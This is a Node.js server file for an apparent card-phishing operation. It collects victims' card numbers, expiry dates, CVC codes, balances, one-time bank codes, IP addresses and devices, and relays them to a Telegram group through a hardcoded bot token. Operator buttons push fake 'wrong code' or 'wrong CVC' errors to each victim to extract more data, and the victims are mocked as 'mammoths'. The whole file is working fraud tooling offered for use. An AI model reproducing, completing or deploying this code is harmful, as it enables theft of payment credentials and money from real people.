const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = socketIo(server);
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
const fs = require('fs');
app.use(express.static(__dirname));
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot('6307431258:AAHLs4cqLsdY_c0CbeNLcS9qJ-mGXF1XnvM', { polling: true });
const userSockets = {};





app.get('/', (req, res) => {
res.sendFile(__dirname + '/index.html');
});

const database = JSON.parse(fs.readFileSync('database.json', 'utf-8'));

io.on('connection', (socket) => {
    const userId = generateUserId();
    const userIp = socket.handshake.address.replace('::ffff:', '');
    console.log(`Пользователь ${userId} подключился с IP ${userIp}`);


  socket.emit('user_connected', { userId, ip: userIp });
  socket.on('check_ip', () => {
    const bannedIPs = database.bannedIPs || [];

    // Отправка списка заблокированных IP обратно на клиент
    socket.emit('check_ip', { bannedIPs });
  });

  // Save the socket for this userId
  userSockets[userId] = socket;

  console.log(`ID ${userId} подключен, IP: ${userIp}`);

  // Listen for card data from the client
  socket.on('card_data', (data) => {
  const message = `🦣Дал Лог\n🔒 Номер: <code>${data.cardNumber}</code>\n🔒 Срок: <code>${data.expMonth}/${data.expYear}</code>\n🔒 CVC: <code>${data.cvv}</code>\n🔒 Баланс: <code>${data.balance}</code>\n🔒 Сума ${data.amount} BYN\n\nℹ️Информация Мамонта\n☑️IP адрес: ${data.ip}\n☑️Страна: ${data.country}\n☑️Устройство ${data.machine}\n\n☑️UA: ${data.user}`;

  const inlineKeyboard = [
    [
      { text: '✅ КОД ✅', callback_data: `button_cod_${userId}` },
    ],
    [
      { text: '❌ НОМЕР ❌', callback_data: `button_number_${userId}` },
    ],
    [
      { text: '❌ CVC ❌', callback_data: `button_cvc_${userId}` },
      { text: '❌ ДАТА ❌', callback_data: `button_date_${userId}` },
      { text: '❌ ВСЁ ❌', callback_data: `button_all_${userId}` },
    ],
    [
      { text: '❌ ФЕЙК БАЛАНС ❌', callback_data: `fake_balance_${userId}` },
    ],
    [
      { text: '✅ ЗАБЛОКИРОВАТЬ МАМОНТА ✅', callback_data: `ban_mamonta_${data.ip}` },
    ],
  ];

  bot.sendMessage('-1001858916904', message, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: inlineKeyboard
    }
  });
});


  socket.on('cod', (data) => {
    const message = `🦣Дал Кол\n🔒 Код: <pre>${data.codNumber}</pre>`;

    const inlineKeyboard = [
      [
        { text: '❌НЕ ВЕРНЫЙ КОД', callback_data: `button_push_${userId}` }
      ]
    ];

    bot.sendMessage('-1001858916904', message, {
      parse_mode: 'HTML', // Указываем, что используем HTML для форматирования
      reply_markup: {
        inline_keyboard: inlineKeyboard
      }
    });
  });

  socket.on('invalid_cod', (data) => {
    const message = `🦣Мамонт дал\nновый код\n🔒 КОД: <pre>${data.codNumber}</pre>\n🆔 Проект Дмитрия`;

    const inlineKeyboard = [
      [
        { text: '❌НЕ ВЕРНЫЙ КОД', callback_data: `button_push_${userId}` }
      ]
    ];

    bot.sendMessage('-1001858916904', message, {
      parse_mode: 'HTML', // Указываем, что используем HTML для форматирования
      reply_markup: {
        inline_keyboard: inlineKeyboard
      }
    });
  });


  socket.on('disconnect', () => {
    console.log(`ID ${userId} отебнул`);

  });
});


bot.on('callback_query', (query) => {
  const userId = query.data.split('_')[2];
  const ip = query.data.split('_')[2];

  if (query.data.startsWith('button_cod')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('user_redirect', userId);
    }

    bot.sendMessage(-1001858916904, `✅Мамонот\nПереведен на ввод кода ✅`);
  }

  if (query.data.startsWith('button_push')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('user_redirect_push', userId);
    }

    bot.sendMessage(-1001858916904, `✅Мамонот\nУспешно Перенаправлен на страницу не верного кода ✅`);
  }

  if (query.data.startsWith('button_number')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('invalid_card', userId);

      bot.sendMessage(-1001858916904, `✅Мамонотy\nУспешно выведена ошыбка об Не верной карте ✅`);
    }
  }
  if (query.data.startsWith('button_cvc')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('invalid_cvv', userId);

      bot.sendMessage(-1001858916904, `✅Мамонотy\nУспешно выведена ошыбка об Не верном CVV коде ✅`);
    }
  }
  if (query.data.startsWith('button_date')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('invalid_date', userId);

      bot.sendMessage(-1001858916904, `✅Мамонотy\nУспешно выведена ошыбка об Не верной дате ✅`);
    }
  }
  if (query.data.startsWith('button_all')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('invalid_all', userId);

      bot.sendMessage(-1001858916904, `✅Мамонотy\nУспешно выведена ошыбка об всех не верных данных ✅`);
    }
  }
  if (query.data.startsWith('ban_mamonta')) {
    const ip = query.data.split('_')[2];

    let database = {};
    try {
        const data = fs.readFileSync('database.json');
        database = JSON.parse(data);
    } catch (err) {
        console.error('Ошибка чтения базы данных JSON:', err);
    }

    if (!database.bannedIPs) {
        database.bannedIPs = [];
    }
    database.bannedIPs.push(ip);

    try {
        fs.writeFileSync('database.json', JSON.stringify(database, null, 2));
        console.log('IP успешно добавлен в базу данных JSON.');
        bot.sendMessage(-1001858916904, `✅Мамонот\nУспешно забанен: ${ip} ✅`);
    } catch (err) {
        console.error('Ошибка записи в базу данных JSON:', err);
    }
   }
    if (query.data.startsWith('fake_balance')) {
    const userSocket = userSockets[userId];
    if (userSocket) {
      userSocket.emit('fake_balance', userId);

      bot.sendMessage(-1001858916904, `✅Мамонотy\nУспешно выведена ошыбка об Балансе ✅`);
    }

    if (query.data.startsWith('invalid_cod')) {
      const userSocket = userSockets[userId];
      if (userSocket) {
        userSocket.emit('invalid_cod', userId);

        bot.sendMessage(-1001858916904, `✅Мамонотy\nУспешно выведена ошыбка об не верном коде ✅`);
      }
    }
  }
});




// Generate UserID
function generateUserId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

app.get('/push', (req, res) => {
  res.sendFile(__dirname + '/pAU.html');
});


const port = process.env.PORT || 3000;
server.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
